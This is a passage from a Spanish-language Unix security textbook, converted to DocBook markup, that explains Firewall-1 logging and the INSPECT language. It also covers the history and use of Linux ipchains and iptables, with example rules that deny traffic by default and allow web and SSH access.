sistema con el m&#x00F3;dulo de cortafuegos de Firewall-1 instalado en &#x00E9;l; hemos de recordar que habitualmente
trabajamos con un simple editor de pol&#x02CA;&#x0131;ticas, de forma que las modi&#xFB01;caciones que realicemos sobre una
determinada pol&#x02CA;&#x0131;tica (a~nadir o eliminar reglas, de&#xFB01;nir nuevos objetos, etc.) no tendr&#x00E1;n ning&#x00FA;n efecto hasta
que esa pol&#x02CA;&#x0131;tica se instale en el cortafuegos correspondiente. Para instalar una pol&#x02CA;&#x0131;tica no tenemos m&#x00E1;s que
escoger la opci&#x00F3;n del men&#x00FA; del gestor gr&#x00E1;&#xFB01;co adecuada; a partir de ese momento, Firewall-1 veri&#xFB01;ca que la
pol&#x02CA;&#x0131;tica escogida es l&#x00F3;gica y consistente, genera y compila el c&#x00F3;digo INSPECT (en el punto  <ulink 
  url="#x1-24800016.1.6"  ><!--ref: inspect--></ulink> hablamos
m&#x02CA;&#x0131;nimamente de este lenguaje) correspondiente para cada objeto sobre el que vayamos a instalarla, y
carga dicho c&#x00F3;digo en el objeto donde se encuentra el m&#x00F3;dulo de cortafuegos a trav&#x00E9;s de un canal seguro.
</para><figure><title/><blockquote>


<!--l. 306--><para>  heightwidthdepthfwlv.png                                                            <graphic width="430.0pt" fileref="fwlv.png" ></graphic>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-2460012"  ></anchor>Figura&#x00A0;16.2</title><para>Una imagen de fwlv.</para></blockquote>

  </para></blockquote></figure>
  </section><!--end subsection--><!--l. 310--><section 
role="subsection"><title><abbrev role="title-mark">16.1.5</abbrev><anchor 
   id="x1-24700016.1.5"  ></anchor>El sistema de log</title>
<!--l. 312--><para>  Cuando una regla tiene de&#xFB01;nido en el campo Track que guarde un log, siempre que una trama haga
match con la misma se generar&#x00E1; un registro del evento, tanto si la conexi&#x00F3;n se acepta como si se deniega. A
diferencia de la mayor parte del software de un sistema Unix, los logs de Firewall-1 no son
simples &#xFB01;cheros ASCII, sino que se almacenan en un formato propio dentro del directorio
$FWDIR/logs/. Para consultarlos hemos de utilizar o bien el visor gr&#x00E1;&#xFB01;co fwlv (&#xFB01;gura  <ulink 
  url="#x1-2460012"  ><!--ref: fwlv--></ulink>) o bien la
orden fw, que tambi&#x00E9;n permite rotarlos (&#x2018;fw logswitch&#x2019;) y exportarlos a &#xFB01;cheros ASCII (&#x2018;fw
logexport&#x2019;):

     </para><literallayout role="verbatim">
&#x00A0;anita:/etc/fw/bin#&#x00A0;./fw&#x00A0;log
&#x00A0;Date:&#x00A0;May&#x00A0;2,&#x00A0;2000
&#x00A0;&#x00A0;3:28:43&#x00A0;ctl&#x00A0;&#x00A0;&#x00A0;&#x00A0;anita&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x003E;daemon&#x00A0;started&#x00A0;sending&#x00A0;log&#x00A0;to&#x00A0;localhost
&#x00A0;&#x00A0;3:49:27&#x00A0;ctl&#x00A0;&#x00A0;&#x00A0;&#x00A0;anita&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x003E;daemon&#x00A0;started&#x00A0;sending&#x00A0;log&#x00A0;to&#x00A0;localhost
&#x00A0;&#x00A0;4:30:30&#x00A0;ctl&#x00A0;&#x00A0;&#x00A0;&#x00A0;anita&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x003E;daemon&#x00A0;started&#x00A0;sending&#x00A0;log&#x00A0;to&#x00A0;localhost
&#x00A0;anita:/etc/fw/bin#&#x00A0;./fw&#x00A0;logexport&#x00A0;-o&#x00A0;/etc/fw/logs/salida.ascii
&#x00A0;Starting&#x00A0;pass&#x00A0;1&#x00A0;of&#x00A0;the&#x00A0;log&#x00A0;file.
&#x00A0;Starting&#x00A0;pass&#x00A0;2&#x00A0;of&#x00A0;the&#x00A0;log&#x00A0;file..
&#x00A0;&#x00A0;&#x00A0;&#x00A0;100.00%&#x00A0;of&#x00A0;log&#x00A0;file&#x00A0;processed.
&#x00A0;
&#x00A0;anita:/etc/fw/bin#&#x00A0;cat&#x00A0;/etc/fw/logs/salida.ascii
&#x00A0;num;date;time;orig;type;action;alert;i/f&#x005F;name;i/f&#x005F;dir;sys&#x005F;msgs
&#x00A0;0;2May2000;&#x00A0;3:28:43;anita;control;ctl;;daemon;inbound;started&#x00A0;sending&#x00A0;log
&#x00A0;to&#x00A0;localhost
&#x00A0;1;2May2000;&#x00A0;3:49:27;anita;control;ctl;;daemon;inbound;started&#x00A0;sending&#x00A0;log
&#x00A0;to&#x00A0;localhost
&#x00A0;2;2May2000;&#x00A0;4:30:30;anita;control;ctl;;daemon;inbound;started&#x00A0;sending&#x00A0;log
&#x00A0;to&#x00A0;localhost
&#x00A0;
&#x00A0;anita:/etc/fw/bin#
</literallayout>
<!--l. 345--><para>Evidentemente, rotar los logs o exportarlos a &#xFB01;cheros ASCII nos puede resultar muy &#x00FA;til a la
hora de realizar estad&#x02CA;&#x0131;sticas o tareas similares, ya que podemos separar los registros por d&#x02CA;&#x0131;as,
meses, horas&#x2026;o cualquier otro par&#x00E1;metro que se nos ocurra y utilizar las herramientas propias de
cualquier Unix (awk, perl, grep&#x2026;) sobre el &#xFB01;chero de texto para extraer el tipo de registros que
nos interese; no obstante, esto a todas luces presenta un grave inconveniente: los registros de
Firewall-1, con lo que hemos visto hasta ahora, no pueden utilizarse para monitorizar el tr&#x00E1;&#xFB01;co en
tiempo real o para ofrecer una respuesta autom&#x00E1;tica ante un ataque. Por supuesto, la detecci&#x00F3;n de
un ataque o&#xFB04;ine, sobre un &#xFB01;chero de registro hist&#x00F3;rico (por ejemplo, podemos buscar tr&#x00E1;&#xFB01;co
sospechoso cada noche sobre el log del d&#x02CA;&#x0131;a anterior) es muy importante, pero sin duda lo es
m&#x00E1;s el que seamos capaces de detectar ese mismo ataque justo cuando se est&#x00E1; produciendo,
para ofrecer as&#x02CA;&#x0131; una respuesta inmediata y minimizar el riesgo asociado a las actividades de
un pirata; cuanto m&#x00E1;s tardemos, m&#x00E1;s posibilidades tiene el atacante de tener &#x00E9;xito en su tarea
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->Para implantar un sistema de respuesta autom&#x00E1;tica en tiempo real, o simplemente para visualizar los
registros generados por el cortafuegos tambi&#x00E9;n en tiempo real podemos utilizar la orden &#x2018;fw log&#x2019;, que
con las opciones adecuadas imprimir&#x00E1; en pantalla cualquier registro que se genere al mismo
tiempo que la entrada se guarda en el &#xFB01;chero de log correspondiente con el formato propio de
Firewall-1:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;fw&#x00A0;log&#x00A0;-f&#x00A0;-n&#x00A0;|head&#x00A0;-3
&#x00A0;2:21:12&#x00A0;drop&#x00A0;&#x00A0;&#x00A0;anita&#x00A0;&#x00A0;&#x00A0;&#x003E;nei0&#x00A0;proto&#x00A0;tcp&#x00A0;src&#x00A0;192.168.0.3&#x00A0;dst&#x00A0;158.42.22.41&#x00A0;&#x005C;
&#x00A0;service&#x00A0;finger&#x00A0;s&#x005F;port&#x00A0;13000&#x00A0;len&#x00A0;40&#x00A0;rule&#x00A0;5
&#x00A0;2:22:23&#x00A0;drop&#x00A0;&#x00A0;&#x00A0;anita&#x00A0;&#x00A0;&#x00A0;&#x003E;nei0&#x00A0;proto&#x00A0;tcp&#x00A0;src&#x00A0;192.168.0.10&#x00A0;&#x00A0;dst&#x00A0;158.42.2.1&#x00A0;&#x005C;
&#x00A0;service&#x00A0;NetBus&#x00A0;s&#x005F;port&#x00A0;32344&#x00A0;len&#x00A0;40&#x00A0;rule&#x00A0;6
&#x00A0;2:22:45&#x00A0;drop&#x00A0;&#x00A0;&#x00A0;anita&#x00A0;&#x00A0;&#x00A0;&#x003E;nei0&#x00A0;proto&#x00A0;tcp&#x00A0;src&#x00A0;192.168.0.1&#x00A0;&#x00A0;dst&#x00A0;192.168.2.3&#x00A0;&#x005C;
&#x00A0;service&#x00A0;echo-tcp&#x00A0;s&#x005F;port&#x00A0;30298&#x00A0;len&#x00A0;40&#x00A0;rule&#x00A0;5
&#x00A0;anita:/#
</literallayout>
<!--l. 381--><para>Como vemos, la salida de esta orden ya puede ser procesada desde l&#x02CA;&#x0131;nea de comandos con las herramientas
habituales de Unix para implantar as&#x02CA;&#x0131; la respuesta autom&#x00E1;tica, por ejemplo mediante &#x2018;fw sam&#x2019;, que
bloquea todo el tr&#x00E1;&#xFB01;co proveniente de una determinada direcci&#x00F3;n en el cortafuegos, de forma permanente o
temporal (<citation>[?]</citation>).
  </para></section><!--end subsection--><!--l. 387--><section 
role="subsection"><title><abbrev role="title-mark">16.1.6</abbrev><anchor 
   id="x1-24800016.1.6"  ></anchor>INSPECT</title>
<!--l. 389--><para>  Como ya hemos comentado, al instalar una pol&#x02CA;&#x0131;tica en un cortafuegos (m&#x00E1;quina con el m&#x00F3;dulo de &#xFB01;rewall)
desde el servidor de gesti&#x00F3;n (m&#x00E1;quina donde se ha instalado el Management Module) Firewall-1 genera en
el mismo servidor de gesti&#x00F3;n un c&#x00F3;digo &#x2013; un script, un simple &#xFB01;chero ASCII editable &#x2013; en un
lenguaje de alto nivel propio de Firewall-1: este lenguaje se denomina INSPECT, es orientado
a objetos, y est&#x00E1; dise~nado expl&#x02CA;&#x0131;citamente para trabajar con cortafuegos, lo que permite por
ejemplo programar las acciones t&#x02CA;&#x0131;picas de un &#xFB01;rewall: detener una trama, aceptarla, generar un
registro&#x2026;
<!--br/-->
<!--br/-->El script de INSPECT generado a partir de la pol&#x02CA;&#x0131;tica editada en el gestor gr&#x00E1;&#xFB01;co (o desde l&#x02CA;&#x0131;nea de
comandos, mediante la orden &#x2018;fw gen&#x2019;) es un &#xFB01;chero &#x2018;.pf&#x2019; que se encuentra en $FWDIR/conf/; este
archivo es compilado mediante fwc y a partir de &#x00E9;l se genera un c&#x00F3;digo (un &#xFB01;chero &#x2018;.fc&#x2019;) dentro de
$FWDIR/tmp/ junto a otros archivos adicionales en el mismo directorio. Como hemos dicho el c&#x00F3;digo
generado se transmite al m&#x00F3;dulo de cortafuegos a trav&#x00E9;s de un canal seguro, y en este m&#x00F3;dulo los demonios de
Firewall-1 son los encargados de cargar el c&#x00F3;digo en el n&#x00FA;cleo del operativo, comenzando as&#x02CA;&#x0131; a ser operativa
la nueva pol&#x02CA;&#x0131;tica.
<!--br/-->
<!--br/-->La carga del c&#x00F3;digo en el cortafuegos se realiza de forma autom&#x00E1;tica tras generar y compilar el &#xFB01;chero &#x2018;.pf&#x2019;
desde el editor gr&#x00E1;&#xFB01;co de pol&#x02CA;&#x0131;ticas, aunque puede llevarse a cabo manualmente mediante &#x00F3;rdenes como &#x2018;fw
load&#x2019; o &#x2018;fw fetch&#x2019;; este c&#x00F3;digo se ejecuta en una m&#x00E1;quina virtual ubicada en el n&#x00FA;cleo del operativo, y su
ejecuci&#x00F3;n b&#x00E1;sicamente consiste en inspeccionar todas las tramas que pasan por el &#xFB01;rewall para decidir qu&#x00E9;
hacer con ellas.
<!--br/-->
<!--br/-->Evidentemente es imposible describir aqu&#x02CA;&#x0131; de forma exhaustiva tanto la sintaxis como la funcionalidad de
INSPECT; para obtener m&#x00E1;s informaci&#x00F3;n acerca de este lenguaje podemos consultar la documentaci&#x00F3;n que
acompa~na a Firewall-1, en concreto el cap&#x02CA;&#x0131;tulo 11 del &#x2018;Architecture and Administration User Guide&#x2019;, que
presenta una excelente introducci&#x00F3;n a INSPECT.
  </para></section><!--end subsection--></section><!--end section--><!--l. 422--><section 
role="section"><title><abbrev role="title-mark">16.2</abbrev><anchor 
   id="x1-24900016.2"  ></anchor>ipfwadm/ipchains/iptables</title>
<!--l. 423--><para>
  </para><!--l. 423--><section 
role="subsection"><title><abbrev role="title-mark">16.2.1</abbrev><anchor 
   id="x1-25000016.2.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 424--><para>  Desde la series 1.1, el kernel de Linux posee en mayor o menor medida capacidad para &#xFB01;ltrar
tramas. Originalmente (1994), ipfwadm era la herramienta proporcionada con Linux para la

implementaci&#x00F3;n de pol&#x02CA;&#x0131;ticas de &#xFB01;ltrado de paquetes en este clon de Unix; derivaba del c&#x00F3;digo de &#xFB01;ltrado
en BSD (ipfw), y debido a sus limitaciones (por ejemplo, s&#x00F3;lo puede manejar los protocolos
TCP, UDP o ICMP) ipfwadm fue reescrito para convertirse en ipchains a partir del n&#x00FA;cleo
2.1.102 (en 1998). Esta nueva herramienta (realmente, todo el subsistema de &#xFB01;ltrado de los
n&#x00FA;cleos 2.2) introdujo bastantes mejoras con respecto a la anterior, pero segu&#x02CA;&#x0131;a careciendo de
algo fundamental: el stateful; era dif&#x02CA;&#x0131;cil ver a un sistema tan potente como Linux sin una
herramienta de &#xFB01;rewalling decente, libre, y &#x2018;de serie&#x2019; con el sistema, mientras otros clones
de Unix, tambi&#x00E9;n gratuitos hac&#x02CA;&#x0131;a tiempo que la incorporaban, como es el caso de FreeBSD e
IPFilter.
<!--br/-->
<!--br/-->De esta forma, no es de extra~nar que a partir del n&#x00FA;cleo 2.3.15 (por tanto, en todos los kernels estables, de
la serie 2.4, desde mediados de 1999) ipchains fuera sustituido por iptables, que de nuevo introduc&#x02CA;&#x0131;a
importantes mejoras con respecto a su predecesor. Sin duda la m&#x00E1;s importante era que ya incorporaba el
stateful no presente en ipchains, pero no era la &#x00FA;nica; adem&#x00E1;s, iptables ofrec&#x02CA;&#x0131;a &#x2013; y de hecho,
ofrece &#x2013; un sistema de NAT (Network Address Translation) mucho m&#x00E1;s avanzado, incorpora
mejoras en el &#xFB01;ltrado (llegando incluso a &#xFB01;ltrar en base a la direcci&#x00F3;n f&#x02CA;&#x0131;sica de las tramas) e
inspecci&#x00F3;n de paquetes, y presenta un subsistema de log mucho m&#x00E1;s depurado que ipchains. Por
tanto,iptables es en la actualidad el software de &#xFB01;rewalling en Linux IPv4; aunque todas las
versiones de Linux lo incorporan por defecto, se puede descargar una versi&#x00F3;n actualizada desde
http://netfilter.samba.org/.
<!--br/-->
<!--br/-->Hist&#x00F3;ricamente, todos los sistemas de &#xFB01;rewalling nativos de Linux han sido orientados a comando:
esto signi&#xFB01;ca, muy por encima, que no leen su con&#xFB01;guraci&#x00F3;n de un determinado &#xFB01;chero, por
ejemplo durante el arranque de la m&#x00E1;quina, sino que ese archivo de arranque ha de ser un
script donde, l&#x02CA;&#x0131;nea a l&#x02CA;&#x0131;nea, se de&#xFB01;nan los comandos a ejecutar para implantar la pol&#x02CA;&#x0131;tica de
seguridad deseada; esta es una importante diferencia con respecto a otros cortafuegos, como
IPFilter (del que hablaremos a continuaci&#x00F3;n), orientados a archivo: en estos la pol&#x02CA;&#x0131;tica se de&#xFB01;ne
en un simple &#xFB01;chero ASCII con una cierta sintaxis, que el software interpreta y carga en el
sistema.
<!--br/-->
<!--br/-->La sintaxis de iptables (o la de ipchains, bastante similar) puede llegar a resultar muy compleja si se
invoca al sistema de &#xFB01;ltrado desde l&#x02CA;&#x0131;nea de &#x00F3;rdenes; por fortuna (o no por fortuna), existen diferentes
interfaces para el administrador, algunos tan c&#x00F3;modos e intuitivos como el de Firewall-1, capaces de
presentar las pol&#x02CA;&#x0131;ticas de una forma gr&#x00E1;&#xFB01;ca basada en objetos y de transformar despu&#x00E9;s esas pol&#x02CA;&#x0131;ticas en
scripts con las &#x00F3;rdenes de iptables o ipchains equivalentes. Un ejemplo de estos interfaces es fwbuilder,
disponible libremente desde http://www.fwbuilder.org/.
<!--br/-->
<!--br/-->Para conocer mejor todo el subsistema de &#xFB01;ltrado en Linux, as&#x02CA;&#x0131; como sus herramientas de gesti&#x00F3;n,
consultas imprescindibles son los HowTo <citation>[?]</citation>, <citation>[?]</citation> y <citation>[?]</citation>; la mayor parte de esta secci&#x00F3;n est&#x00E1; basada
en estas obras. Otros documentos que pueden resultar especialmente interesantes son <citation>[?]</citation> y
<citation>[?]</citation>.
<!--br/-->
<!--br/-->iptables o ipchains son herramientas &#xFB02;exibles, potentes e, igual de importante, gratuitas, que funcionan
sobre un sistema operativo tambi&#x00E9;n gratuito; quiz&#x00E1;s para una organizaci&#x00F3;n de I+D o para una empresa no
muy grande sea dif&#x02CA;&#x0131;cil permitirse soluciones comerciales cuyo precio puede ascender a varios
millones de pesetas, especialmente si se van a instalar cortafuegos internos o arquitecturas DMZ
de varios niveles. Sin embargo, no hay excusa para no utilizar este software de &#xFB01;ltrado: un
peque~no PC corriendo Linux es m&#x00E1;s que su&#xFB01;ciente para, en muchas ocasiones, garantizar &#x2013; o al
menos incrementar &#x2013; la seguridad de un laboratorio, un aula inform&#x00E1;tica o un conjunto de
despachos.
  </para></section><!--end subsection--><!--l. 486--><section 
role="subsection"><title><abbrev role="title-mark">16.2.2</abbrev><anchor 
   id="x1-25100016.2.2"  ></anchor>Arquitectura</title>
<!--l. 487--><para>  En Linux el &#xFB01;ltrado de paquetes est&#x00E1; construido en el kernel (se habla con m&#x00E1;s detalle del n&#x00FA;cleo de este
sistema operativo en la secci&#x00F3;n  <ulink 
  url="#x1-15000010.6"  ><!--ref: linkernel--></ulink>); en la serie 2.2, para poder utilizar ipchains hemos de compilar el n&#x00FA;cleo
con las opciones CONFIG<informalequation><graphic 
fileref="unixsec298x.gif"></graphic></informalequation>FIREWALL y CONFIG<informalequation><graphic 
fileref="unixsec299x.gif"></graphic></informalequation>IP<informalequation><graphic 
fileref="unixsec300x.gif"></graphic></informalequation>FIREWALL activadas, mientras que en las 2.4,

para iptables, hemos de activar CONFIG<informalequation><graphic 
fileref="unixsec301x.gif"></graphic></informalequation>NETFILTER: es toda la &#x2018;instalaci&#x00F3;n&#x2019; (aparte de las
herramientas de gesti&#x00F3;n de espacio de usuario, que vienen de serie con Linux) que nuestro &#xFB01;rewall va a
necesitar, de ah&#x02CA;&#x0131; que en este caso no dediquemos una subsecci&#x00F3;n espec&#x02CA;&#x0131;&#xFB01;ca a la instalaci&#x00F3;n del
cortafuegos.
<!--br/-->
<!--br/-->Cuando ya estamos ejecutando un n&#x00FA;cleo con el &#xFB01;rewalling activado utilizaremos las herramientas de
espacio de usuario ipchains e iptables para insertar y eliminar reglas de &#xFB01;ltrado en &#x00E9;l; al tratarse
de informaci&#x00F3;n din&#x00E1;mica, cada vez que el sistema se reinicie las reglas establecidas se perder&#x00E1;n,
por lo que es recomendable crear un script que se ejecute al arrancar el sistema y que las
vuelva a de&#xFB01;nir. Para ello nos pueden resultar &#x00FA;tiles un par de shellscripts que acompa~nan a las
herramientas de espacio de usuario: se trata de ipchains-save e ipchains-restore (n&#x00FA;cleos 2.2)
y de iptables-save e iptables-restore (n&#x00FA;cleos 2.4); en ambos casos, la primera orden
vuelca en pantalla las reglas de&#xFB01;nidas en el n&#x00FA;cleo y la segunda carga dichas reglas desde un
archivo.
<!--br/-->
<!--br/-->El n&#x00FA;cleo de Linux agrupa las diferentes reglas de&#xFB01;nidas por el administrador en tres listas denominadas
chains: input, output y forward (en may&#x00FA;sculas para los kernels 2.4); en funci&#x00F3;n de las caracter&#x02CA;&#x0131;sticas
de una trama, Linux aplica las reglas de&#xFB01;nidas en cada una de estas listas para decidir qu&#x00E9;
hacer con el paquete. En primer lugar, al recibir una trama utiliza las reglas de la chain input
(su nombre es autoexplicativo) para decidir si la acepta o no; si las reglas de&#xFB01;nidas en esta
lista indican que se ha de aceptar el paquete, se comprueba a d&#x00F3;nde ha de enrutarlo, y en el
caso de que el destino sea una m&#x00E1;quina diferente al cortafuegos se aplican las reglas de la lista
forward para reenviarlo a su destino. Finalmente, la lista output se utiliza obviamente antes de
enviar un paquete por un interfaz de red, para decidir si el tr&#x00E1;&#xFB01;co de salida se permite o se
deniega.
<!--br/-->
<!--br/-->Como hemos dicho, los elementos de cada lista se denominan reglas y de&#xFB01;nen &#x2013; junto a los
targets, de los que hablaremos a continuaci&#x00F3;n &#x2013; qu&#x00E9; hacer con los paquetes que cumplen ciertas
caracter&#x02CA;&#x0131;sticas; si un paquete no cumple ninguna de las reglas de la lista que le corresponde, lo mejor
si queremos un sistema seguro es rechazarlo o denegarlo, para lo cual podemos de&#xFB01;nir un
tratamiento por defecto. Mediante ipchains e iptables podemos crear listas, modi&#xFB01;carlas y
eliminarlas <anchor 
   id="x1-251001f1"  ></anchor><footnote><para>     A excepci&#x00F3;n de las tres listas prede&#xFB01;nidas, que no se pueden borrar.</para></footnote>
y, lo realmente importante, de&#xFB01;nir las reglas para cada lista; para estudiar las opciones de ambas &#x00F3;rdenes se
pueden consultar las p&#x00E1;ginas ipchains(8), ipfw(4), ipchains-restore(8), ipchains-save(8) e
iptables(8).
<!--br/-->
<!--br/-->Cuando un paquete cumple cumple una determinada regla de una chain de&#xFB01;nimos qu&#x00E9; hacer con &#x00E9;l mediante
lo que se denomina &#x2018;objetivo&#x2019; o target (quiz&#x00E1;s una traducci&#x00F3;n menos literal pero m&#x00E1;s clari&#xFB01;cadora ser&#x02CA;&#x0131;a
&#x2018;acci&#x00F3;n&#x2019;). Aunque existen m&#x00E1;s targets, son tres los que m&#x00E1;s se suelen utilizar: ACCEPT permite el paso de un
paquete, DENY lo bloquea, y REJECT tambi&#x00E9;n lo bloquea pero a diferencia del anterior env&#x02CA;&#x0131;a al origen una
noti&#xFB01;caci&#x00F3;n mediante un mensaje ICMP de tipo DEST<informalequation><graphic 
fileref="unixsec303x.gif"></graphic></informalequation>UNREACH (siempre que el paquete bloqueado no sea
tambi&#x00E9;n de tipo ICMP). Realmente, aunque REJECT y DENY nos parezcan igual de seguros &#x2013; y de hecho en
la mayor&#x02CA;&#x0131;a de situaciones lo sean &#x2013; siempre es m&#x00E1;s recomendable utilizar DENY, ya que mediante mensajes
ICMP un posible atacante podr&#x02CA;&#x0131;a conseguir informaci&#x00F3;n sobre nuestro entorno que en ciertos casos
puede comprometer nuestra seguridad, tal y como hemos comentado cuando habl&#x00E1;bamos de
Firewall-1.
  </para></section><!--end subsection--><!--l. 548--><section 
role="subsection"><title><abbrev role="title-mark">16.2.3</abbrev><anchor 
   id="x1-25200016.2.3"  ></anchor>Gesti&#x00F3;n</title>
<!--l. 549--><para>  Vamos a ver un ejemplo de de&#xFB01;nici&#x00F3;n de una pol&#x02CA;&#x0131;tica de seguridad b&#x00E1;sica utilizando tanto iptables como
ipchains; por cuestiones de simplicidad nos centraremos exclusivamente en el &#xFB01;ltrado de paquetes, no en
otros aspectos como la redirecci&#x00F3;n de puertos o el NAT.
<!--br/-->
<!--br/-->Lo primero que posiblemente nos interese antes de comenzar a de&#xFB01;nir reglas de &#xFB01;ltrado sea &#x2018;vaciar&#x2019; las
chains, es decir, eliminar todas las reglas asociadas a cada lista, de forma que no inter&#xFB01;eran con las que
vamos a comenzar a de&#xFB01;nir; para ello podemos utilizar la opci&#x00F3;n &#x2018;-F&#x2019; tanto de iptables como de

ipchains (recordemos que en el primer caso, los nombres de las chains son los mismos, pero en
may&#x00FA;sculas). Adem&#x00E1;s, podemos de&#xFB01;nir una pol&#x02CA;&#x0131;tica por defecto mediante la opci&#x00F3;n &#x2018;-P&#x2019; de ambas
herramientas; esta pol&#x02CA;&#x0131;tica ser&#x00E1; la que se aplicar&#x00E1; cuando un paquete no sea contemplado por ninguna de las
reglas de una determinada chain:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-P&#x00A0;input&#x00A0;DENY
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-F&#x00A0;input
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-P&#x00A0;output&#x00A0;ACCEPT
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-F&#x00A0;output
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-P&#x00A0;forward&#x00A0;DENY
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-F&#x00A0;forward
&#x00A0;luisa:~#
</literallayout>
<!--l. 574--><para>Como vemos, lo que vamos a hacer por defecto es denegar todo el tr&#x00E1;&#xFB01;co que se dirija al cortafuegos,
tanto si va dirigido a &#x00E9;l como si se ha de reenviar a otro sistema, y permitir todo el tr&#x00E1;&#xFB01;co de
salida. Como vemos, estas pol&#x02CA;&#x0131;ticas por defecto se pueden de&#xFB01;nir antes de &#x2018;limpiar&#x2019; cada chain,
ya que la limpieza s&#x00F3;lo afecta a las reglas en s&#x02CA;&#x0131; (y esta acci&#x00F3;n por defecto no se considera una
regla).
<!--br/-->
<!--br/-->Una vez aplicadas las primeras acciones, nos interesar&#x00E1; sobre todo, ya que la salida la permitimos por
completo (y de las redirecciones de tr&#x00E1;&#xFB01;co ya hemos dicho que no vamos a entrar en detalle),
de&#xFB01;nir accesos permitidos a nuestro sistema; por ejemplo, es posible que necesitemos un acceso
total al puerto 80 para que todo el mundo pueda maravillarse de esas p&#x00E1;ginas web que hemos
hecho con vi. Si es ese el caso, podemos permitir dicho acceso mediante una regla similar a la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-A&#x00A0;input&#x00A0;-p&#x00A0;tcp&#x00A0;-j&#x00A0;ACCEPT&#x00A0;-d&#x00A0;158.42.22.41&#x00A0;80
&#x00A0;luisa:~#
</literallayout>
<!--l. 593--><para>Estamos indicando que se a~nada (&#x2018;-A&#x2019;) en la chain &#x2018;input&#x2019; (tramas de entrada) una regla que
permita (&#x2018;ACCEPT&#x2019;) el tr&#x00E1;&#xFB01;co TCP (&#x2018;-p&#x2019;) cuyo destino (&#x2018;-d&#x2019;) sea el puerto 80 de la direcci&#x00F3;n
158.42.22.41 &#x2013; en principio, la IP de nuestro servidor web &#x2013;. Con iptables, la sintaxis cambia
ligeramente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/iptables&#x00A0;-A&#x00A0;INPUT&#x00A0;-p&#x00A0;TCP&#x00A0;-j&#x00A0;ACCEPT&#x00A0;-d&#x00A0;158.42.22.41&#x00A0;--dport&#x00A0;80
&#x00A0;luisa:~#
</literallayout>
<!--l. 605--><para>Una vez de&#xFB01;nidas estas reglas, mediante la opci&#x00F3;n &#x2018;-L&#x2019; de ipchains e iptables podemos comprobar
que efectivamente se est&#x00E1;n aplicando (utilizamos tambi&#x00E9;n &#x2018;-n&#x2019; para que no se haga resoluci&#x00F3;n
DNS):

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-L&#x00A0;-n
&#x00A0;Chain&#x00A0;input&#x00A0;(policy&#x00A0;DENY):
&#x00A0;target&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;prot&#x00A0;opt&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;source&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;destination&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ports
&#x00A0;ACCEPT&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcp&#x00A0;&#x00A0;------&#x00A0;&#x00A0;0.0.0.0/0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;158.42.22.41&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;-&#x003E;&#x00A0;&#x00A0;&#x00A0;80
&#x00A0;Chain&#x00A0;forward&#x00A0;(policy&#x00A0;DENY):
&#x00A0;Chain&#x00A0;output&#x00A0;(policy&#x00A0;ACCEPT):
&#x00A0;luisa:~#
</literallayout>
<!--l. 620--><para>Ahora pensemos que quiz&#x00E1;s tambi&#x00E9;n queremos acceder a nuestro servidor de forma remota, utilizando SSH,
pero en este caso no desde cualquier lugar de Internet sino desde una direcci&#x00F3;n concreta; la regla a a~nadir a
la chain &#x2018;input&#x2019; en este caso ser&#x02CA;&#x0131;a la siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-A&#x00A0;input&#x00A0;-p&#x00A0;tcp&#x00A0;-j&#x00A0;ACCEPT&#x00A0;-s&#x00A0;158.42.2.1&#x00A0;-d&#x00A0;&#x005C;
&#x00A0;&#x003E;&#x00A0;158.42.22.41&#x00A0;22
&#x00A0;luisa:~#
</literallayout>
<!--l. 631--><para>Podemos ver que ahora especi&#xFB01;camos la direcci&#x00F3;n origen (&#x2018;-s&#x2019;) desde la que vamos a permitir el tr&#x00E1;&#xFB01;co (en
este ejemplo, 158.42.2.1). Si utiliz&#x00E1;ramos iptables la sintaxis ser&#x02CA;&#x0131;a la siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/iptables&#x00A0;-A&#x00A0;INPUT&#x00A0;-p&#x00A0;TCP&#x00A0;-j&#x00A0;ACCEPT&#x00A0;-s&#x00A0;158.42.2.1&#x00A0;-d&#x00A0;&#x005C;
&#x00A0;&#x003E;&#x00A0;158.42.22.41&#x00A0;--dport&#x00A0;22
&#x00A0;luisa:~#
</literallayout>
<!--l. 641--><para>Tal y como hemos de&#xFB01;nido hasta ahora nuestra pol&#x02CA;&#x0131;tica de seguridad, s&#x00F3;lo estamos permitiendo
conexiones al puerto 80 desde cualquier m&#x00E1;quina y al puerto 22 desde la especi&#xFB01;cada; el resto del
